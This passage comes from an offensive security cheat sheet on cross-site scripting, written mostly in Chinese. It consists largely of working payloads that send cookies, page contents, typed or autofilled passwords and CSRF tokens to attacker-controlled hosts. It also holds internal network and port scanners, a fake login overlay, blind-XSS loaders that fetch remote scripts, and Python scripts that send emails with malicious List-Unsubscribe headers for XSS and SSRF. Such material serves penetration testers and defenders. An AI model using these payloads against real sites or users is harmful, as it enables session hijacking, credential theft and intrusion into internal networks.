<img src=x onerror=this.src="http://<YOUR_SERVER_IP>/?c="+document.cookie>
<img src=x onerror="location.href='http://<YOUR_SERVER_IP>/?c='+ document.cookie">
<script>new Image().src="http://<IP>/?c="+encodeURI(document.cookie);</script>
<script>new Audio().src="http://<IP>/?c="+escape(document.cookie);</script>
<script>location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.write('<img src="http://<YOUR_SERVER_IP>?c='+document.cookie+'" />')</script>
<script>window.location.assign('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['assign']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['href']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>document.location=["http://<YOUR_SERVER_IP>?c",document.cookie].join()</script>
<script>var i=new Image();i.src="http://<YOUR_SERVER_IP>/?c="+document.cookie</script>
<script>window.location="https://<SERVER_IP>/?c=".concat(document.cookie)</script>
<script>var xhttp=new XMLHttpRequest();xhttp.open("GET", "http://<SERVER_IP>/?c="%2Bdocument.cookie, true);xhttp.send();</script>
<script>eval(atob('ZG9jdW1lbnQud3JpdGUoIjxpbWcgc3JjPSdodHRwczovLzxTRVJWRVJfSVA+P2M9IisgZG9jdW1lbnQuY29va2llICsiJyAvPiIp'));</script>
<script>fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net', {method: 'POST', mode: 'no-cors', body:document.cookie});</script>
<script>navigator.sendBeacon('https://ssrftest.com/x/AAAAA',document.cookie)</script>
```
> [!TIP]
> 如果 cookie 设置了 HTTPOnly 标志，你**无法从 JavaScript 访问这些 cookie**。不过，如果你足够幸运，这里有[绕过该保护的一些方法](../hacking-with-cookies/index.html#httponly)。

### 窃取页面内容
```javascript
var url = "http://10.10.10.25:8000/vac/a1fbf2d1-7c3f-48d2-b0c3-a205e54e09e8"
var attacker = "http://10.10.14.8/exfil"
var xhr = new XMLHttpRequest()
xhr.onreadystatechange = function () {
if (xhr.readyState == XMLHttpRequest.DONE) {
fetch(attacker + "?" + encodeURI(btoa(xhr.responseText)))
}
}
xhr.open("GET", url, true)
xhr.send(null)
```
### 查找内部 IPs
```html
<script>
var q = []
var collaboratorURL =
"http://5ntrut4mpce548i2yppn9jk1fsli97.burpcollaborator.net"
var wait = 2000
var n_threads = 51

// Prepare the fetchUrl functions to access all the possible
for (i = 1; i <= 255; i++) {
q.push(
(function (url) {
return function () {
fetchUrl(url, wait)
}
})("http://192.168.0." + i + ":8080")
)
}

// Launch n_threads threads that are going to be calling fetchUrl until there is no more functions in q
for (i = 1; i <= n_threads; i++) {
if (q.length) q.shift()()
}

function fetchUrl(url, wait) {
console.log(url)
var controller = new AbortController(),
signal = controller.signal
fetch(url, { signal })
.then((r) =>
r.text().then((text) => {
location =
collaboratorURL +
"?ip=" +
url.replace(/^http:\/\//, "") +
"&code=" +
encodeURIComponent(text) +
"&" +
Date.now()
})
)
.catch((e) => {
if (!String(e).includes("The user aborted a request") && q.length) {
q.shift()()
}
})

setTimeout((x) => {
controller.abort()
if (q.length) {
q.shift()()
}
}, wait)
}
</script>
```
### Port Scanner (fetch)
```javascript
const checkPort = (port) => { fetch(http://localhost:${port}, { mode: "no-cors" }).then(() => { let img = document.createElement("img"); img.src = http://attacker.com/ping?port=${port}; }); } for(let i=0; i<1000; i++) { checkPort(i); }
```
### Port Scanner (websockets)
```python
var ports = [80, 443, 445, 554, 3306, 3690, 1234];
for(var i=0; i<ports.length; i++) {
var s = new WebSocket("wss://192.168.1.1:" + ports[i]);
s.start = performance.now();
s.port = ports[i];
s.onerror = function() {
console.log("Port " + this.port + ": " + (performance.now() -this.start) + " ms");
};
s.onopen = function() {
console.log("Port " + this.port+ ": " + (performance.now() -this.start) + " ms");
};
}
```
_Short times indicate a responding port_ _Longer times indicate no response._

查看 Chrome 中被封禁的端口列表 [**here**](https://src.chromium.org/viewvc/chrome/trunk/src/net/base/net_util.cc) 和 Firefox 中的列表 [**here**](https://www-archive.mozilla.org/projects/netlib/portbanning#portlist)。

### 用于请求凭证的框
```html
<style>::placeholder { color:white; }</style><script>document.write("<div style='position:absolute;top:100px;left:250px;width:400px;background-color:white;height:230px;padding:15px;border-radius:10px;color:black'><form action='https://example.com/'><p>Your sesion has timed out, please login again:</p><input style='width:100%;' type='text' placeholder='Username' /><input style='width: 100%' type='password' placeholder='Password'/><input type='submit' value='Login'></form><p><i>This login box is presented using XSS as a proof-of-concept</i></p></div>")</script>
```
### 自动填充密码捕获
```javascript
<b>Username:</><br>
<input name=username id=username>
<b>Password:</><br>
<input type=password name=password onchange="if(this.value.length)fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```
当在 password 字段中输入任何数据时，username 和 password 会被发送到攻击者的服务器；即使客户端选择了已保存的密码且没有输入任何内容，凭证仍会被 ex-filtrated。

### Hijack form handlers to exfiltrate credentials (const shadowing)

如果一个关键 handler（例如 `function DoLogin(){...}`）在页面的后部声明，而你的 payload 提前运行（例如通过 inline JS-in-JS sink），可以先定义一个同名的 `const` 来抢占并锁定该 handler。后续的函数声明无法重新绑定该 `const` 名称，从而让你的 hook 保持控制权：
```javascript
const DoLogin = () => {
const pwd  = Trim(FormInput.InputPassword.value);
const user = Trim(FormInput.InputUtente.value);
fetch('https://attacker.example/?u='+encodeURIComponent(user)+'&p='+encodeURIComponent(pwd));
};
```
注意事项
- 这依赖于执行顺序：你的注入必须在合法声明之前执行。
- 如果你的 payload 被包在 `eval(...)` 中，`const/let` 绑定不会成为全局变量。使用章节 “Deliverable payloads with eval(atob()) and scope nuances” 中的动态 `<script>` 注入技术，以确保真正的全局、不可重新绑定的绑定。
- 当关键字过滤阻止代码时，结合使用 Unicode 转义标识符或 `eval(atob('...'))` 交付，如上所示。

### Keylogger

我在 github 搜索后找到几个不同的：

- [https://github.com/JohnHoder/Javascript-Keylogger](https://github.com/JohnHoder/Javascript-Keylogger)
- [https://github.com/rajeshmajumdar/keylogger](https://github.com/rajeshmajumdar/keylogger)
- [https://github.com/hakanonymos/JavascriptKeylogger](https://github.com/hakanonymos/JavascriptKeylogger)
- 你也可以使用 metasploit 的 `http_javascript_keylogger`

### Stealing CSRF tokens
```javascript
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/email',true);
req.send();
function handleResponse() {
var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
var changeReq = new XMLHttpRequest();
changeReq.open('post', '/email/change-email', true);
changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```
### 窃取 PostMessage 消息
```html
<img src="https://attacker.com/?" id=message>
<script>
window.onmessage = function(e){
document.getElementById("message").src += "&"+e.data;
</script>
```
### 滥用 Service Workers


{{#ref}}
abusing-service-workers.md
{{#endref}}

### 访问 Shadow DOM


{{#ref}}
shadow-dom.md
{{#endref}}

### Polyglots


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xss_polyglots.txt
{{#endref}}

### Blind XSS payloads

你也可以使用： [https://xsshunter.com/](https://xsshunter.com)
```html
"><img src='//domain/xss'>
"><script src="//domain/xss.js"></script>
><a href="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">Click Me For An Awesome Time</a>
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//0mnb1tlfl5x4u55yfb57dmwsajgd42.burpcollaborator.net/scriptb");a.send();</script>

<!-- html5sec - Self-executing focus event via autofocus: -->
"><input onfocus="eval('d=document; _ = d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')" autofocus>

<!-- html5sec - JavaScript execution via iframe and onload -->
"><iframe onload="eval('d=document; _=d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')">

<!-- html5sec - SVG tags allow code to be executed with onload without any other elements. -->
"><svg onload="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')" xmlns="http://www.w3.org/2000/svg"></svg>

<!-- html5sec -  allow error handlers in <SOURCE> tags if encapsulated by a <VIDEO> tag. The same works for <AUDIO> tags  -->
"><video><source onerror="eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">

<!--  html5sec - eventhandler -  element fires an "onpageshow" event without user interaction on all modern browsers. This can be abused to bypass blacklists as the event is not very well known.  -->
"><body onpageshow="eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">

<!-- xsshunter.com - Sites that use JQuery -->
<script>$.getScript("//domain")</script>

<!-- xsshunter.com - When <script> is filtered -->
"><img src=x id=payload&#61;&#61; onerror=eval(atob(this.id))>

<!-- xsshunter.com - Bypassing poorly designed systems with autofocus -->
"><input onfocus=eval(atob(this.id)) id=payload&#61;&#61; autofocus>

<!-- noscript trick -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

<!-- whitelisted CDNs in CSP -->
"><script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.1/angular.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.1/angular.min.js"></script>
<!-- ... add more CDNs, you'll get WARNING: Tried to load angular more than once if multiple load. but that does not matter you'll get a HTTP interaction/exfiltration :-]... -->
<div ng-app ng-csp><textarea autofocus ng-focus="d=$event.view.document;d.location.hash.match('x1') ? '' : d.location='//localhost/mH/'"></textarea></div>

<!-- Payloads from https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide -->
<!-- Image tag -->
'"><img src="x" onerror="eval(atob(this.id))" id="Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw==">

<!-- Input tag with autofocus -->
'"><input autofocus onfocus="eval(atob(this.id))" id="Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw==">

<!-- In case jQuery is loaded, we can make use of the getScript method -->
'"><script>$.getScript("{SERVER}/script.js")</script>

<!-- Make use of the JavaScript protocol (applicable in cases where your input lands into the "href" attribute or a specific DOM sink) -->
javascript:eval(atob("Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw=="))

<!-- Render an iframe to validate your injection point and receive a callback -->
'"><iframe src="{SERVER}"></iframe>

<!-- Bypass certain Content Security Policy (CSP) restrictions with a base tag -->
<base href="{SERVER}" />

<!-- Make use of the meta-tag to initiate a redirect -->
<meta http-equiv="refresh" content="0; url={SERVER}" />

<!-- In case your target makes use of AngularJS -->
{{constructor.constructor("import('{SERVER}/script.js')")()}}
```
### Regex - 访问隐藏内容

From [**this writeup**](https://blog.arkark.dev/2022/11/18/seccon-en/#web-piyosay) it's possible to learn that even if some values disappear from JS, it's still possible to find them in JS attributes in different objects. For example, an input of a REGEX is still possible to find it after the value of the input of the regex was removed:
```javascript
// Do regex with flag
flag = "CTF{FLAG}"
re = /./g
re.test(flag)

// Remove flag value, nobody will be able to get it, right?
flag = ""

// Access previous regex input
console.log(RegExp.input)
console.log(RegExp.rightContext)
console.log(
document.all["0"]["ownerDocument"]["defaultView"]["RegExp"]["rightContext"]
)
```
### Brute-Force 列表


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xss.txt
{{#endref}}

## XSS 利用其他漏洞

### XSS 在 Markdown

能注入会被渲染的 Markdown 代码吗？也许你可以获得 XSS！查看：


{{#ref}}
xss-in-markdown.md
{{#endref}}

### XSS 转为 SSRF

在 **使用缓存的站点** 上发现 XSS？尝试通过 Edge Side Include Injection 使用以下 payload 将其 **升级为 SSRF**：
```python
<esi:include src="http://yoursite.com/capture" />
```
Use it to bypass cookie restrictions, XSS filters and much more!\
More information about this technique here: [**XSLT**](../xslt-server-side-injection-extensible-stylesheet-language-transformations.md).

### XSS in dynamic created PDF

如果网页使用用户可控的输入创建 PDF，你可以尝试**欺骗创建 PDF 的 bot**以**执行任意 JS 代码**。\
因此，如果**PDF creator bot finds**某类 **HTML** **tags**，它会**解释**它们，你可以**滥用**该行为来触发**Server XSS**。

{{#ref}}
server-side-xss-dynamic-pdf.md
{{#endref}}

如果你无法注入 HTML 标签，尝试**注入 PDF 数据**可能值得一试：

{{#ref}}
pdf-injection.md
{{#endref}}

### XSS in Amp4Email

AMP（旨在加速移动设备上的网页性能）结合了 HTML 标签和 JavaScript 来保证功能，强调速度和安全。它支持一系列组件，可通过 [AMP components](https://amp.dev/documentation/components/?format=websites) 访问。

[**AMP for Email**](https://amp.dev/documentation/guides-and-tutorials/learn/email-spec/amp-email-format/) 格式将特定的 AMP 组件扩展到邮件中，使收件人能够直接在邮件内与内容交互。

示例 [**writeup XSS in Amp4Email in Gmail**](https://adico.me/post/xss-in-gmail-s-amp4email).

### List-Unsubscribe Header Abuse (Webmail XSS & SSRF)

RFC 2369 的 `List-Unsubscribe` header 嵌入攻击者控制的 URI，许多 webmail 和 mail 客户端会自动将其转换为 “Unsubscribe” 按钮。当这些 URI 在未经过验证的情况下被渲染或获取时，该 header 就成了注入点：如果取消订阅链接被放入 DOM 则可能导致 stored XSS；如果服务器代表用户执行取消订阅请求则可能导致 SSRF。

#### Stored XSS via `javascript:` URIs

1. **Send yourself an email**，让 header 指向一个 `javascript:` URI，同时保持邮件其余部分无害，以免被垃圾邮件过滤器拦截。
2. **Ensure the UI renders the value**（许多客户端在 “List Info” 面板中显示），并检查生成的 `<a>` 标签是否继承了攻击者控制的属性，例如 `href` 或 `target`。
3. **Trigger execution**（例如 CTRL+click、鼠标中键点击，或“在新标签页中打开”）当链接使用 `target="_blank"` 时；浏览器会在 webmail 应用的 origin 中评估所提供的 JavaScript。
4. 观察 stored-XSS 原语：payload 会随邮件持久存在，只需一次点击即可执行。
```text
List-Unsubscribe: <javascript://attacker.tld/%0aconfirm(document.domain)>
List-Unsubscribe-Post: List-Unsubscribe=One-Click
```
URI 中的换行字节 (`%0a`) 表明即使是不常见的字符也会在渲染管线中存活，在像 Horde IMP H5 这类易受攻击的客户端中，会在 a 标签内按原样输出该字符串。

<details>
<summary>用于投递恶意 List-Unsubscribe header 的最小 SMTP PoC</summary>
```python
#!/usr/bin/env python3
import smtplib
from email.message import EmailMessage

smtp_server = "mail.example.org"
smtp_port = 587
smtp_user = "user@example.org"
smtp_password = "REDACTED"
sender = "list@example.org"
recipient = "victim@example.org"

msg = EmailMessage()
msg.set_content("Testing List-Unsubscribe rendering")
msg["From"] = sender
msg["To"] = recipient
msg["Subject"] = "Newsletter"
msg["List-Unsubscribe"] = "<javascript://evil.tld/%0aconfirm(document.domain)>"
msg["List-Unsubscribe-Post"] = "List-Unsubscribe=One-Click"

with smtplib.SMTP(smtp_server, smtp_port) as smtp:
smtp.starttls()
smtp.login(smtp_user, smtp_password)
smtp.send_message(msg)
```
</details>

#### 服务端退订代理 -> SSRF

有些客户端（例如 Nextcloud Mail app）会在服务端代理退订动作：点击按钮会指示服务器自行抓取所提供的 URL。这样就把该 header 变成了一个 SSRF 原语，尤其是当管理员将 `'allow_local_remote_servers' => true`（记录见 [HackerOne report 2902856](https://hackerone.com/reports/2902856)）时，允许向 loopback 和 RFC1918 网段发起请求。

1. **制作一封邮件**，其中 `List-Unsubscribe` 指向攻击者控制的端点（用于盲 SSRF 时使用 Burp Collaborator / OAST）。
2. **保持 `List-Unsubscribe-Post: List-Unsubscribe=One-Click`**，以便 UI 显示一键退订按钮。
3. **满足信任要求**：例如 Nextcloud 只有在消息通过 DKIM 时才会执行 HTTPS 退订请求，因此攻击者必须用其控制的域为邮件签名。
4. **将邮件投递到目标服务器处理的邮箱**，并等待用户点击退订按钮。
5. **在 collaborator 端点观察服务端回调**，一旦确认该原语有效，就转向内部地址进行探测。
```text
List-Unsubscribe: <http://abcdef.oastify.com>
List-Unsubscribe-Post: List-Unsubscribe=One-Click
```
<details>
<summary>用于 SSRF 测试的 DKIM 签名 List-Unsubscribe 邮件</summary>
```python
#!/usr/bin/env python3
import smtplib
from email.message import EmailMessage
import dkim

smtp_server = "mail.example.org"
smtp_port = 587
smtp_user = "user@example.org"
smtp_password = "REDACTED"
dkim_selector = "default"
dkim_domain = "example.org"
dkim_private_key = """-----BEGIN PRIVATE KEY-----\n...\n-----END PRIVATE KEY-----"""

msg = EmailMessage()
msg.set_content("One-click unsubscribe test")
msg["From"] = "list@example.org"
msg["To"] = "victim@example.org"
msg["Subject"] = "Mailing list"
msg["List-Unsubscribe"] = "<http://abcdef.oastify.com>"
msg["List-Unsubscribe-Post"] = "List-Unsubscribe=One-Click"

raw = msg.as_bytes()
signature = dkim.sign(
message=raw,
selector=dkim_selector.encode(),
domain=dkim_domain.encode(),
privkey=dkim_private_key.encode(),
include_headers=["From", "To", "Subject"]
)
msg["DKIM-Signature"] = signature.decode().split(": ", 1)[1].replace("\r", "").replace("\n", "")

with smtplib.SMTP(smtp_server, smtp_port) as smtp:
smtp.starttls()
smtp.login(smtp_user, smtp_password)
smtp.send_message(msg)
```
</details>

**测试说明**

- 使用 OAST endpoint 收集盲 SSRF 命中，然后在确认该利用原语后，将 `List-Unsubscribe` URL 调整为指向 `http://127.0.0.1:PORT`、metadata services 或其他内部主机。
- 因为 unsubscribe helper 常常重用与应用相同的 HTTP 堆栈，你会继承其 代理设置、HTTP 方法 和 头部重写，从而能够使用在 [SSRF methodology](../ssrf-server-side-request-forgery/README.md) 中描述的进一步遍历技巧。

### XSS 上传文件 (svg)

将以下文件作为图片上传（来自 [http://ghostlulz.com/xss-svg/](http://ghostlulz.com/xss-svg/)）：
```html
Content-Type: multipart/form-data; boundary=---------------------------232181429808
Content-Length: 574
-----------------------------232181429808
Content-Disposition: form-data; name="img"; filename="img.svg"
Content-Type: image/svg+xml

<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
<script type="text/javascript">
alert(1);
</script>
</svg>
-----------------------------232181429808--
```

```html
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<script type="text/javascript">alert("XSS")</script>
</svg>
```

```html
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
<script type="text/javascript">
alert("XSS");
</script>
</svg>
```

```svg
<svg width="500" height="500"
xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<circle cx="50" cy="50" r="45" fill="green"
id="foo"/>

<foreignObject width="500" height="500">
<iframe xmlns="http://www.w3.org/1999/xhtml" src="data:text/html,&lt;body&gt;&lt;script&gt;document.body.style.background=&quot;red&quot;&lt;/script&gt;hi&lt;/body&gt;" width="400" height="250"/>
<iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:document.write('hi');" width="400" height="250"/>
</foreignObject>
</svg>
```

```html
<svg><use href="//portswigger-labs.net/use_element/upload.php#x" /></svg>
```

```xml
<svg><use href="data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg' &gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x" />
```
在 [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet) 查找 **更多 SVG payloads**

## 杂项 JS 技巧与相关信息


{{#ref}}
other-js-tricks.md
{{#endref}}

## XSS 资源

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection)
- [http://www.xss-payloads.com](http://www.xss-payloads.com) [https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt](https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt) [https://github.com/materaj/xss-list](https://github.com/materaj/xss-list)
- [https://github.com/ismailtasdelen/xss-payload-list](https://github.com/ismailtasdelen/xss-payload-list)
- [https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec](https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec)
- [https://netsec.expert/2020/02/01/xss-in-2020.html](https://netsec.expert/2020/02/01/xss-in-2020.html)
- [https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide](https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide)

## 参考资料

- [将无害的 XSS（在 WAF 后）变成现实的 phishing vector](https://blog.hackcommander.com/posts/2025/12/28/turning-a-harmless-xss-behind-a-waf-into-a-realistic-phishing-vector/)
- [在 Horde Webmail 和 Nextcloud Mail 中通过 List-Unsubscribe SMTP Header 导致 XSS 和 SSRF](https://security.lauritz-holtmann.de/post/xss-ssrf-list-unsubscribe/)
- [HackerOne 报告 #2902856 - Nextcloud Mail List-Unsubscribe SSRF](https://hackerone.com/reports/2902856)
- [从“低影响” RXSS 到 Credential Stealer：JS-in-JS 演练](https://r3verii.github.io/bugbounty/2025/08/25/rxss-credential-stealer.html)
- [MDN eval() 文档](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval)

{{#include ../../banners/hacktricks-training.md}}
